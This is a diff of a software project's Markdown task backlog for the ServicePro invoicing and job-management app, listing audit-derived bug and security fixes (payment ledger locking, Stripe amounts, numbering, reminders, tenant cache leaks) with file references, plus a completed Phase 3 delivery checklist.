+**What it does** — In one transaction: `SELECT … FOR UPDATE` the invoice, insert the payment, update `amount_paid`, `status` and `paid_date`. Reject payments on `draft`, `cancelled` and `refunded` invoices and overpayments (checked under the lock). Make `DeleteInvoice`/`CancelInvoice` refuse invoices that have payments (`invoice_service.go:249,482`). Test against Postgres.
 
-- Sprints are 2 weeks
-- Each sprint should have 1-2 P0/P1 items max
-- Fill remaining capacity with P2/P3 items
-- Always include at least one testing task
+**Why we need it** — `invoice_service.go:412-415` says "triggers will update invoice", but `001_schema.sql` has no such trigger (only `:614` updated_at, `:634` number, `:719` updated_at). So a recorded payment leaves the invoice `sent`, A/R still shows it owed, reminders keep firing, the online pay link charges the full amount again, and the overpayment guard never trips.
+
+**Notes** — correctness audit 7.C1 (critical), 7.M15. Folds in the old "Resolve Payment Tracking TODOs" item. Stripe-side idempotency is T109; refunds are T125.
 
 ---
 
-_Last updated: 2026-02-02_
+#### T119 — Stripe Checkout charges the true balance due
+
+**Phase**: 2 · **Category**: Payments · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T118
+
+**What it is** — The online pay link charges exactly `total_amount - amount_paid`, in the tenant's currency, rounded correctly to cents.
+
+**What it does** — Replace the per-line Checkout items in `invoice_payment_service.go:130-167` with one line item for the balance due. Today `Quantity.IntPart()` (line 133) truncates fractional quantities, line and invoice discounts are ignored, `amount_paid` is ignored and currency is hard-coded `"usd"`. Allow online payment of `partially_paid` invoices (`invoice_service.go:664` accepts only `sent`). Fix cents conversion: `stripe/client.go:638-640` truncates with `IntPart()` and assumes 2-decimal currencies; round half-up and use the currency's minor-unit exponent.
+
+**Why we need it** — Customers are currently charged the wrong amount, and `MarkInvoiceAsPaid` then adds Stripe's `AmountTotal`, which can overshoot into a negative `amount_due`.
+
+**Notes** — correctness audit 7.C2, 7.L3. The money path moves to Connect in T169; this amount logic carries over unchanged. Currency source is T127.
+
+---
+
+#### T120 — Invoice and job numbering survives soft-delete and concurrency
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T102
+
+**What it is** — Invoice, quote and job numbers come from a per-tenant counter, are unique per tenant, and deleting a record never blocks future creates.
+
+**What it does** — Add a `tenant_counters (tenant_id, kind, next_value)` table and allocate with `UPDATE … SET next_value = next_value + 1 RETURNING` inside the create transaction; format with the tenant prefix (T127). Make the unique constraints `(tenant_id, invoice_number)` etc. Remove the `MAX(invoice_number)+1` logic (`invoice_service.go:530-548`), the dead DB trigger (`001_schema.sql:618-635`, never fires because Go always sets the number) and the job-number GORM hook (`models/job.go:100-110`, `COUNT(today)+1`).
+
+**Why we need it** — Invoice numbering reads through the soft-delete scope while the UNIQUE constraint (`schema:571`) includes deleted rows, so deleting the newest draft makes every later invoice create fail. Job numbering does the same, so after any job deletion job creation fails until midnight. Both race under concurrency and are global across tenants.
+
+**Notes** — correctness audit 7.C3, 7.C4.
+
+---
+
+#### T121 — Payment reminders actually send
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — The reminder run finds overdue invoices, sends only the next reminder that's due, on the customer's channel (email or SMS), at most once.
+
+**What it does** — Qualify the columns in `payment_reminder_service.go:93` (`invoices.status`, `invoices.due_date`) — the join with `customers` makes `status` ambiguous, so the query errors for every tenant. Pass the SMS client into the service (`routes/services.go:161` hard-codes `SMSClient: nil`). Send only the next due reminder per pass (today one pass sends #1, #2 and #3 at once for long-overdue invoices, `:116-141`); stop manual reminders using `MAX+1` numbering that skips automatic #1 (`:228-233`); let `failed` rows retry (`:164-190`); claim the `(invoice_id, reminder_number)` row before sending (UNIQUE at `schema:1824`); check the error on the dedupe `Count` (`:121`); make `Worker.Stop()` idempotent (`payment_reminder_worker.go:57`).
+
+**Why we need it** — T034/T043 shipped the feature, but because of the ambiguous column, reminders have never been sent — and automated collections is the product's wedge.
+
+**Notes** — correctness audit 7.H1, 3.4, 7.M8. Scheduling moves out of the process in T141. Days-overdue uses UTC (`:113,148`) — tenant timezone is T099/T127.
+
+---
+
+#### T122 — Fix /webhooks/stripe panicking on subscription and invoice events
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — One Stripe webhook endpoint handles both platform billing (subscriptions) and invoice payments without panicking.
+
+**What it does** — Delete the legacy handler behind `POST /api/v1/webhooks/stripe` (`webhook_handler.go`; registered at `routes/v1/auth_routes.go:33-34`), whose `ctx.(interface{ Request() *http.Request })` assertions at `:108,130,165` always panic. Port its `customer.subscription.*`, `invoice.paid` and `invoice.payment_failed` handling into the processor behind `POST /api/v1/stripe/webhooks` (`services/stripe/webhook.go:224`, which already uses `IgnoreAPIVersionMismatch`). Delete the dead DB-backed `services/stripe/webhook_handler.go` (53 unreachable functions). Point the Stripe dashboard at the single endpoint.
+
+**Why we need it** — Every subscription and invoice event currently returns 500 and Stripe retries for 3 days, so ServicePro's own plan state never syncs. Two endpoints that both handle `invoice.paid` would double-process if both were configured.
+
+**Notes** — security audit F-9; correctness audit 4.1, 5.3. Needed before T210 (ServicePro plans).
+
+---
+
+#### T123 — Add the missing SQL functions and views behind customer search and reports
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Customer advanced search, autocomplete, stats and the customer report endpoints return data instead of 500s.
+
+**What it does** — `customer_repository.go:268,291` call `search_customers()`, `:315` calls `autocomplete_customers()` and `:330` reads view `customer_search_stats` — none exist in `001_schema.sql`. `customer_report_service.go:502` reads `v_customer_cohorts` and `:544` calls `refresh_customer_metrics_cache()` — neither exists, and `customer_metrics_cache` is never populated, so top/at-risk/segment reports are empty. `:116,140` use `Table("customers")` while the filters reference alias `c.` (`:742-757`), so any filtered request fails with "missing FROM-clause entry for table c". Either add the objects to the schema or rewrite the queries in Go (preferred: fewer DB-side objects to port in T156). Add GIN `gin_trgm_ops` indexes on customer name/email (pg_trgm is installed but unused; the `%term%` searches at `:123,201` scan).
+
+**Why we need it** — `GET /customers/advanced-search`, `/autocomplete` and `/stats` always 500, and the customer report pages are broken or empty.
+
+**Notes** — correctness audit 7.H8, 7.H9, index list item 2. Must be tenant-scoped (T102).
+
+---
+
+#### T124 — Enforce invoice status transitions; unify the two job state machines
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Invoice and job statuses change only through explicit, validated transitions recorded in history, and there is one job state machine.
+
+**What it does** — Invoices: remove `status` from the generic update DTO (`invoice_handler.go:421-423` → `invoice_service.go:194,209`; only `paid` is protected today) and add a transition table (send, void, mark paid via payment only). Jobs: delete the state rules in `pkg/validators/job.go:247-285` and keep `models/job_status.go:89-240` (the validator lacks `new`, `en_route`, `invoiced`, `paid`, so `CancelJob` at `:556` fails for new jobs and `StartJob` rejects `en_route`); `UpdateJob` (`:262-264`) must not change status. Write status and history in one transaction; fix the creation history row (`job_service.go:158` passes `from_status=""` into a NOT NULL enum, error swallowed, as are `:480,529,944-946`) and set `AssignedAt` (`:163,711`, currently epoch 0). Add the "allowed transitions" endpoint the UI needs.
+
+**Why we need it** — `PUT {"status":"paid"}` marks an invoice paid with no money received and revives cancelled or refunded invoices. Jobs created as `new` can't be cancelled, and a status changed through UpdateJob makes a later `CompleteJob` fail.
+
+**Notes** — correctness audit 7.H2, 7.H7, 7.M1, 7.M2. Folds in the old "Orphaned Features → Job Status State Machine" remaining items (allowed-transitions endpoint; bulk status change dropped). T058 (required fields per stage) builds on this.
+
+---
+
+#### T125 — Handle refunds in the ledger
+
+**Phase**: 2 · **Category**: Payments · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T118, T109
+
+**What it is** — A Stripe refund (full or partial) reduces the invoice's `amount_paid`, records a refund row and moves the invoice to `refunded` or back to `partially_paid`.
+
+**What it does** — Handle `charge.refunded` (today only logged at `stripe/events.go:416-427`) in the same idempotent processor as T109; add a `payment_refunds` table (referenced by dead code but never created); recompute status under the invoice lock from T118. Manual refunds recorded in-app follow the same path.
+
+**Why we need it** — Without it, refunded money still shows as collected in A/R and revenue reports, and `refunded` status is never set.
+
+**Notes** — correctness audit 7.H5, 7.L (missing `payment_refunds`).
+
+---
+
+#### T126 — Backend Sentry actually initialised; wire or delete the Loki/BetterStack/OTel stubs
+
+**Phase**: 2 · **Category**: Monitoring · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Backend panics and errors reach Sentry, logs go to stdout as structured JSON, and provider packages that are never linked are deleted.
+
+**What it does** — Blank-import `pkg/clients/errortracking/sentry` (and `/mock`) in `cmd/main.go` — neither is in `go list -deps ./cmd`, so `errortracking.NewClient` always fails and `RecoveryMiddleware` (`middleware/error_handler.go:126`) reports nothing. Default to a JSON stdout logger in production (Cloud Run ships stdout to Cloud Logging); delete `logging/{betterstack,loki,cloudwatch}`, `metrics/cloudwatch` and `pkg/clients/tracing/*` plus the `go.opentelemetry.io/*` modules and `OTEL_*` config (`config.go:542-548`). Replace `logging.Fatal(...)`+`os.Exit(1)` in `cmd/main.go` with a `run() error` so deferred flushes (Sentry, PostHog) run.
+
+**Why we need it** — The "Integrated Sentry logs" commit (d15346e) only touched the frontend; backend errors are invisible today, and in production the logging and metrics factories fail on providers that aren't compiled in.
+
+**Notes** — correctness audit 3.1, 3.2, 3.3, §6 (`main.go` flush). Folds in the old P3 "Advanced Observability Setup (Loki/BetterStack)" item — Better Stack is used for uptime/status only (T165, T208).
+
+---
+
+#### T127 — Backend reads tenant settings: currency, number prefixes, defaults
+
+**Phase**: 2 · **Category**: Backend · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — The org settings the UI already lets admins edit — currency, invoice/quote/job prefixes, default payment term and tax rate, date format — actually change backend behaviour.
+
+**What it does** — Load `TenantSettings` (`internal/models/tenant.go:48-67`) once per request or job; use `Currency` for invoices, quotes and Stripe (T119); prefixes in the T120 counters; `DefaultPaymentTermID`/`DefaultTaxRateID` on create. Hide any setting that still has no effect. Fix date-only handling while here: due dates are DATE values read as UTC midnight then `.In(loc)`, which shifts them a day early in US zones, and `Hours()/24` is off by one across DST (`payment_terms_service.go:255-264,313-360`).
+
+**Why we need it** — None of these settings is read anywhere in backend code (0 references outside the model), so admins change them and nothing happens.
+
+**Notes** — correctness audit 3.5, 7.M9 (date-only part). Timezone and business hours are T099 (T100 stored them).
+
+---
+
+#### T128 — Exports safe on multiple instances (object storage + persisted progress)
+
+**Phase**: 2 · **Category**: Backend · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T160
+
+**What it is** — Export jobs write their file to object storage, keep progress in the DB, and can be downloaded from any instance via a presigned URL.
+
+**What it does** — Today exports write to `./exports/<jobID>/` (`unified_export_service.go:107,169,202`), hold progress in process memory (`initProgress`, `:116`), run in a detached goroutine with `context.Background()` (`:121`) and serve downloads with `os.Open(job.FilePath)` (`:944`). Upload to R2 through the storage client, return presigned URLs, store progress on the export job row, check the swallowed status-save errors (`:141,158,225,981,1038`). Small exports can run synchronously. Tests use `t.TempDir()` instead of `./test_exports` (`unified_export_service_test.go:142`).
+
+**Why we need it** — On Cloud Run a download routed to another instance 404s, a scale-down loses the file, and with request-based CPU the goroutine is throttled after the POST returns.
+
+**Notes** — correctness audit 1.4, §6, §0 (test artifacts). T199 (full data export) reuses this.
+
+---
+
+#### T129 — Backend dead-code removal and a stricter linter
+
+**Phase**: 2 · **Category**: Cleanup · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T126
+
+**What it is** — The backend contains only code the binary uses, and the linter catches unused code and swallowed errors from now on.
+
+**What it does** — Delete the 21 never-linked packages (`internal/analytics`, `api/handlers/webhooks`, `api/validators`, `internal/errors` (or adopt it in T223), `models/payment`, `services/recurring` (unless T167 adopts it), `services/subscriptions`, `pkg/search`, `pkg/utils/permissions`, `templates`, `templates/email`, the logging/metrics/tracing providers from T126) and the large unreachable chunks (`assignment_handler.go` + `assignment_service.go` + `pkg/notifications`, the download stack, `middleware/{access_control,access_logging,auth,logger}.go`, `quote_status_machine.go` (see T224), `invoice_template_service.go`, `conflict/{validator,resolver}.go`, legacy `repository/user_repository.go` + `UserRepositoryInterface` + `pkg/database/postgres.go`). Enable `errcheck` (excluding Close and excelize), `staticcheck`, `unused`, `ineffassign` in `.golangci.yml`; fix the 2 goimports failures (`internal/analytics/aggregator.go:10`, `repository/schedule_repository.go:4`), the deprecated `strings.Title` calls and the 16 discarded GORM `.Error` sites. Delete `backend/tests/Makefile` (single-Makefile rule). `go mod tidy`.
+
+**Why we need it** — 476 unreachable functions and ~10–12k lines inflate every later migration (chi, pgx) and hide real bugs; the permissive linter is why swallowed errors built up.
+
+**Notes** — correctness audit §0, §4.4–4.6, §5, §6. Do before T155/T156 — the audit estimates ~30% less chi work after deletion.
+
+---
+
+#### T130 — Login error swallowed by the refresh interceptor
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — A wrong password shows an error on the login page instead of a silent reload.
+
+**What it does** — In `frontend/src/services/api.ts:56-77` skip the 401 → refresh → `window.location.href='/login'` path for `/v1/auth/*` URLs, navigate via the router instead of a hard reload, and make refresh single-flight (a shared `refreshPromise`; the Dashboard fires 6 parallel requests, `DashboardPage.tsx:83-105`). Preserve deep links: `ProtectedRoute.tsx:20-22` should pass `state.from` and `LoginPage.tsx:43` should use the unused `getPostLoginRedirect()` (`routes/index.tsx:547`). Update `tests/integration/auth.integration.test.tsx`.
+
+**Why we need it** — The login endpoint returns 401 for bad credentials (`auth_handler.go:68,126,140`), so today a mistyped password blanks the form and `LoginPage`'s `setError` (`:44-49`) never renders. Emailed `/invoices/:id` links lose their target after login.
+
+**Notes** — frontend audit 3.1, 3.8.
+
+---
+
+#### T131 — Public payment result pages for the /pay/:token flow
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 1 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — End customers who pay through the public link land on public success/cancelled pages, not the staff login.
+
+**What it does** — Add public routes (e.g. `/pay/success`, `/pay/cancelled`) with no tenant chrome, and point the Checkout success/cancel URLs at them (`backend/internal/api/routes/services.go:129-130`, built from `FRONTEND_URL`). Keep the staff-side deep link under `ProtectedRoute`. Update `tests/integration/invoice.integration.test.tsx`.
+
+**Why we need it** — `/invoices/payment-success|cancelled` sit inside `ProtectedRoute` (`routes/index.tsx:444-452`) while checkout starts from the public `GET /pay/:token` (`invoices_routes.go:96`), so a customer who just paid is dumped on `/login`.
+
+**Notes** — frontend audit 3.2.
+
+---
+
+#### T132 — Clear tenant and user data on logout and tenant switch
+
+**Phase**: 2 · **Category**: Security · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Logging out or switching tenant leaves no previous user's or tenant's data in the browser, and the `X-Tenant-ID` header always matches the validated current tenant.
+
+**What it does** — Drop `persistQueryClient` (`providers/QueryProvider.tsx:85-140`; there's no offline use case), or at least include `tenantId` in every query key (`['quotes', filters]`, `useRoles.ts:14-22`, …). On logout (`store/authStore.ts:70-87`) and tenant switch (`TenantSwitcher.tsx:42-44`): `queryClient.clear()`, reset the tenant store and remove `current_tenant_id`. Derive `X-Tenant-ID` from the store, not a separate localStorage key (`api.ts:33-45`); validate the persisted tenant against the freshly loaded list and write it when `loadTenants` picks `tenants[0]` (`tenantStore.ts:31-42`).
+
+**Why we need it** — On a shared office PC, user B sees user A's cached customers, quotes, roles and A/R for up to the 5-minute stale time, and B's requests carry A's tenant header.
+
+**Notes** — frontend audit 2.2, 2.3. Backend membership check on the header is T104. T162 later replaces the query layer with tenant-scoped key factories.
+
+---
+
+#### T133 — Job times entered and shown in the tenant's timezone, stored as true UTC
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — A job scheduled for 09:00 shows at 09:00 everywhere — form, calendar and backend logic — in the tenant's timezone.
+
+**What it does** — `utils/epoch.ts:5-26` treats the `datetime-local` value as UTC (`value + ':00Z'`) while `JobCalendarPage.tsx:34-38` renders browser-local time. Convert inputs from the tenant timezone (`currentTenant.settings.timezone`, set via T100) with `@date-fns/tz`, store true UTC epoch, render the calendar in the tenant timezone. Fix the min/max bounds (`JobDetailPage.tsx:91-102`) and uses at `:184,256,289,318,563`. Also: default invoice/quote dates from `new Date().toISOString()` become tomorrow after ~7–8 pm in US zones (`InvoiceDetailPage.tsx:103-104`, `QuoteDetailPage.tsx:82,147`), and due/valid-until dates are sent as `T23:59:59Z` (`InvoiceDetailPage.tsx:265-268`, `QuoteDetailPage.tsx:232`).
+
+**Why we need it** — For an EDT dispatcher a 09:00 job shows at 05:00 on the calendar, and reminders and conflict detection see 05:00 local.
+
+**Notes** — frontend audit 3.3. Backend half (conflict detection, days overdue) is T099.
+
+---
+
+#### T134 — Strip sensitive query params from analytics and error breadcrumbs
+
+**Phase**: 2 · **Category**: Security · **Hours**: 1 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Reset, verification and invitation tokens never leave the browser to PostHog or Sentry.
+
+**What it does** — `App.tsx:9-17` `PageViewTracker` sends `location.search` on every navigation, so `/reset-password?token=…` (`ResetPasswordPage.tsx:40`), `/verify-email?token=…` and `/invitations/accept?token=…` ship single-use secrets to PostHog. Strip `search` (or allow-list params) before `trackEvent`; add a Sentry `beforeBreadcrumb` that drops `token=` (the existing `sanitizeData` in `services/errorTracking/sentry.ts:204` redacts by key name, not URL). Use `params: {token}` in `authApi.verifyEmail` (`api.ts:111`).
+
+**Why we need it** — Single-use account secrets are currently sent to a third party on every page view.
+
+**Notes** — frontend audit 2.4, 2.5.
+
+---
+
+#### T135 — Frontend medium-severity sweep
+
+**Phase**: 2 · **Category**: Frontend · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Lists show errors as errors, pickers handle more than 100 customers, money is formatted by one helper, and a few stray fetch/Sentry settings are fixed.
+
+**What it does** — (1) Error vs empty states: `CustomersPage.tsx:34-48` sends errors to `console.error` and renders "No customers yet" (`:143`); `handleSearch` (`:50-54`) fires a double request with no ordering guard — same pattern across the ~26 `useEffect` pages; add `isError` UI. (2) Customer pickers capped at `page_size: 100` (`InvoiceDetailPage.tsx:112`, `QuoteDetailPage.tsx:90`, `JobDetailPage.tsx:162`) → async search combobox. (3) Tax-rate input shows `7.000000000000001` (`InvoiceDetailPage.tsx:127-129`, `QuoteDetailPage.tsx:105-107`); client totals use unrounded float math (`InvoiceDetailPage.tsx:236-252,682-685`, `QuoteDetailPage.tsx:203-218,622-625`). (4) Ten `formatCurrency` implementations, some taking cents and some dollars (`types/payment.ts:295`, `types/membership.ts:130` divide by 100) → one `utils/money.ts` with `formatCents`/`formatDollars`, tenant currency. (5) `components/payments/methods/AddPaymentMethod.tsx:88` uses raw `fetch` bypassing the axios instance (dead today — delete with T137 unless T171 revives it). (6) Sentry `tracePropagationTargets` (`services/errorTracking/sentry.ts:93`) point at `*.servicepro.com`; use same-origin `/api` and `servicepro.sharkfins.xyz`. (7) Lazy-load posthog-js and Sentry Replay (`main.tsx:5-18`, ~340 KB `vendor` chunk) and move `@sentry/react` from devDependencies to dependencies.
+
+**Why we need it** — A backend hiccup currently looks like "you have no customers"; tenants with 101+ customers can't invoice the 101st; mixing cents and dollars helpers with the same name is a latent 100× display bug.
+
+**Notes** — frontend audit 1.3, 3.4, 3.5, 3.6, 3.7. Items 1 and 3.7 are fully solved by T162.
+
+---
+
+#### T136 — Green frontend test suite and lint
+
+**Phase**: 2 · **Category**: Testing · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — `npm run lint` and `vitest run` pass with no retries, on a pinned Node version.
+
+**What it does** — Fix the 8 lint warnings (`--max-warnings 0`), including the real `exhaustive-deps` one at `InvoiceDetailPage.tsx:107`. Fix the 87 failing tests: stub `document.elementFromPoint` in `src/test/setup.ts` (react-big-calendar DnD, 142 errors); delete the tests for removed subscription components (`tests/components/subscriptions/*`) and `types/subscription.ts`; update the auth store mock (`checkAuth`); stub `localStorage` explicitly (Node ≥ 25's experimental global shadows jsdom's); update integration tests whose text/role queries no longer match. Remove `retry: 1` (`vite.config.ts:166`), resolve the 2 skipped tests, replace deprecated `test.deps.inline` (`:142-145`). Node pinned via `frontend/.nvmrc` (22) + `engines`.
+
+**Why we need it** — A red suite with retries makes CI meaningless, and CLAUDE.md requires the integration tests to track the workflows.
+
+**Notes** — frontend audit 1.1, 1.2. Gating input for T145 (CI rewrite).
+
+---
+
+#### T137 — Frontend dead-code removal (~18.5k unreachable lines)
+
+**Phase**: 2 · **Category**: Cleanup · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — The frontend contains only code reachable from the router, and the ts-prune baseline is no longer needed.
+
+**What it does** — Delete: `components/templates/*` (no route), `components/payments/*` (stories/tests only), `components/{charts,kpi,skeletons,filters}/*`, `store/kpiStore.tsx`, `components/OptimizedImage.tsx`, the unused `components/quotes/*` (keep `QuoteActionsMenu`) and `quotes/utils/pdfGenerator.tsx` with `@react-pdf/renderer`, `hooks/useWebSocket.ts`, `services/realtime/*`, `hooks/useCache.ts`, the never-registered service worker (`service-worker.ts`, `utils/registerServiceWorker.tsx`) with `vite-plugin-pwa` and Workbox. Remove duplicate `Skeleton`, `DateRangePicker`, `theme/colors.ts`, the second loading/preload system and no-op `webpackChunkName` comments. Delete tracked scaffolding docs (`SETUP_SUMMARY.md`, `TEMPLATE_SYSTEM.md`, `components/quotes/*.md`, `components/roles/IMPLEMENTATION_SUMMARY.md`). Drop `.dead-code-baseline.json` once the baseline is empty.
+
+**Why we need it** — Dead code is most of the failing tests and misleading docs, and it multiplies the cost of T162–T164.
+
+**Notes** — frontend audit 4.1–4.3. Folds in the old P2 "Review Barrel Export Files" item. T018 (Feb 2026) removed an earlier ~2.7k lines. Do before T162–T164.
+
+---
+
+#### T138 — Preview polish: honest contact form, legal pages marked draft, favicon
+
+**Phase**: 2 · **Category**: UX · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — The public pages don't pretend: the contact form really sends, legal pages say they are drafts, and the site has icons and its own font.
+
+**What it does** — Wire `pages/Contact/ContactPage.tsx:23-27` (currently a `setTimeout` then "success") to an API endpoint that emails support, or replace it with `mailto:`. Mark Privacy/Terms (`pages/Legal/*Page.tsx:44` TODOs) "Draft — under review" with a fixed date instead of `Last updated: {today}` (`:40`). Replace the About page placeholder story (`AboutPage.tsx:62`). Add a favicon and the manifest icons (`public/` holds only `.gitkeep`; `index.html:5` references `/vite.svg`; `vite.config.ts:35-45` references `/icon-192.png`, `/icon-512.png`). Self-host Inter (`@fontsource-variable/inter`) instead of Google Fonts.
+
+**Why we need it** — Messages from prospects are silently dropped today, and the placeholder legal text and generic tab icon read as "template" to anyone invited.
+
+**Notes** — frontend audit 3.9, §7. Folds in the old P2 "Complete Footer Links" item (the pages now exist). Real legal review is T207.
+
+---
+
+#### T223 — Request IDs and a standard API error envelope
+
+**Phase**: 2 · **Category**: Backend · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Every request has an ID that appears in logs, error responses and the frontend's error UI, and every error response uses one JSON shape.
+
+**What it does** — Install a request-ID middleware (the existing `middleware/logger.go` `RequestIDMiddleware` is never mounted, although CORS already exposes `X-Request-ID`); generate when absent, put it in the request context and every log line, return it in the `X-Request-ID` header. Define one envelope `{error: code, message, request_id, details?}` with field-level `details` for validation errors, using `go-playground/validator` consistently; adopt or delete the unused `internal/errors` package that CLAUDE.md points to. Frontend shows the request ID ("Error ID") on 5xx and sends it to Sentry.
+
+**Why we need it** — Without correlation IDs, a user's "it broke" can't be matched to a log line; inconsistent error shapes make client handling and T116's "no raw `err.Error()`" rule hard to keep.
+
+**Notes** — Folds in three old untagged items: "Request Correlation IDs" (P1), "Standardize API Error Responses" (P2) and "Comprehensive Input Validation" (P1). correctness audit 5.1 (`internal/errors` unused), 5.2 (`RequestIDMiddleware` not installed). Pairs with T116 (F-17).
+
+---
+
+#### T224 — Quote correctness: lost customer edits, accept race, expiry, editable sent quotes
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
+
+**What it is** — Editing a quote keeps the new customer, accept/reject can't race, quotes past `valid_until` expire, and sent quotes are read-only.
+
+**What it does** — Use `tx.Omit(clause.Associations).Save(quote)` in `quote_repository.go:85` (saving with preloaded `Customer`, `CreatedByUser`, `UpdatedByUser` resets the foreign keys, so `CustomerID`/`UpdatedBy` changes are lost). Make accept/reject conditional (`WHERE status = 'sent'`, check `RowsAffected`, `quote_repository.go:240-286`). Add a small expiry job (T141) that moves `sent` quotes past `valid_until` to `expired`, and delete the never-constructed `services/quote_status_machine.go` (its `→expired` transition only allowed from `accepted`; `:118` has customer-email validation commented out). Block edits to sent quotes (`models/quote.go:198`) except via "revise". Round the subtotal from rounded line totals (`models/quote.go:232-247`).
+
+**Why we need it** — Office staff change a quote's customer and it silently reverts; two people accepting/declining at once can both succeed; stale quotes never expire.
+
+**Notes** — correctness audit 7.H6, 7.M4, 7.M6, 7.L1. Folds in old "Removed Features → Other Fixes" (`quote_status_machine.go:118`). T028/T041/T183 rely on correct quote states.
+
+---
+
+#### T225 — Invoice totals: one server-side recalculation, tax/discount order, no double invoicing
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T118
+
+**What it is** — Invoice totals are always recomputed on the server from lines, discounts and tax in a defined order, boolean defaults don't flip, and a job or quote can't be invoiced twice.
+
+**What it does** — Recalculate totals inside the update transaction on every change (`invoice_handler.go:445-505` recalculates only when `lines` is sent; a discount or tax-rate change alone leaves `total_amount` stale, and `lines` without `tax_rate` zeroes every line's tax). Apply invoice-level discount before tax and actually use `DiscountPercentage` (`:337-365`); make PDF lines sum to totals (`document_pdf_service.go:360`). Fix GORM `default:true` tags that turn `false` into `true` on insert (`InvoiceLine.Taxable` `models/invoice.go:209`, `TaxRate.IsActive`, `PaymentTerm.IsActive`, `Schedule.RemindersEnabled`, `TenantUser.IsActive`) with `*bool` or no tag. Reject invoicing declined/draft quotes and already-invoiced jobs (`invoice_handler.go:302-303`) and move jobs to `invoiced`/`paid` (via T124).
+
+**Why we need it** — Customers can be billed a stale or wrongly taxed total, non-taxable lines get taxed, and nothing stops the same job being invoiced twice.
+
+**Notes** — correctness audit 7.H3, 7.M3, 7.M5, 7.M7. Job money stored as `float64` (7.M14) is decided in T166. T029/T030 depend on the double-invoicing guard.
+
+---
+
+#### T226 — Tenant creation and invitation acceptance in transactions; per-tenant uniqueness
+
+**Phase**: 2 · **Category**: Bug · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T102
+
+**What it is** — Creating a tenant and accepting an invitation either fully succeed or leave nothing behind, re-invites work, and uniqueness rules are per tenant.
+
+**What it does** — Wrap tenant + owner membership + default tier in one transaction (`tenant_service.go:109-136` creates, then soft-deletes on failure, which burns the globally UNIQUE slug at `001_schema.sql:1036` forever; tier failure at `:154-158` is only logged); make the slug unique `WHERE deleted_at IS NULL`; drop the debug query (`:145-150`) and hard-coded admin role UUID (`:119`). Accept invitations in one transaction with `SELECT … FOR UPDATE` and set `IsActive`, `RoleID`, `AcceptedAt` on an existing `tenant_users` row (`invitation_service.go:195-257`, `:226-229`; errors discarded at `:207,286`). Make invitation uniqueness a partial index `WHERE status = 'pending'` (`schema:1095`), and make customer email (`:221`), the one-default payment term (`:567`) and one-default invoice template (`:769`) unique per tenant.
+
+**Why we need it** — A failed signup locks the user out of their own slug, a re-invited ex-member stays deactivated with their old role, and re-inviting after a cancelled invite fails with a duplicate-key error.
+
+**Notes** — correctness audit 4.2, 4.3, 7.M12, 7.M13. Authorization of these endpoints is T103.
+
+---
+
+### Phase 3 — Platform & Delivery (T101, T139, T140, T141, T142, T143, T144, T145, T146, T147, T148, T149, T150, T151, T152)
+
+Migrations, versioning, CI, the release pipeline and the edge setup — League Looper's delivery pattern applied to ServicePro. From `docs/audits/2026-10-16/infra.md`. Deploy jobs stay skipped until Phase 14 provisions GCP. **1 open tasks, ~2h.** 14 done.
+
+- [x] T139 — golang-migrate baseline (000001), cmd/migrate, dev-only startup migrations ✓ (2026-10-16)
+- [x] T140 — /version endpoint and schema-aware readiness ✓ (2026-10-16)
+- [x] T141 — Background tickers → internal job endpoints + scheduled-jobs workflow ✓ (2026-10-16)
+- [x] T142 — Redis optional at boot ✓ (2026-10-16)
+- [x] T143 — Cloud Run-ready Dockerfile and .dockerignore ✓ (2026-10-16)
+- [x] T144 — DB pool sizing and pooler (simple protocol) support ✓ (2026-10-16)
+- [x] T145 — CI rewrite: lint, tests with Postgres+Redis, govulncheck, OpenAPI drift, frontend, Docker + Trivy ✓ (2026-10-16)
+- [x] T146 — Tag-driven release-deploy pipeline, VERSION scripts and RELEASING.md ✓ (2026-10-16)
+- [x] T147 — Dependabot deps() prefixes, automerge and weekly security scan ✓ (2026-10-16)
+- [x] T148 — Versioned bash git hooks replace python pre-commit; commit-msg prefix contract ✓ (2026-10-16)
+- [x] T149 — Repo hygiene: tracked artifacts, Fly/nginx/cliff removal, .gitignore, single Makefile ✓ (2026-10-16)
+- [x] T150 — Cloudflare Workers static assets + /api edge proxy Worker + _headers ✓ (2026-10-16)
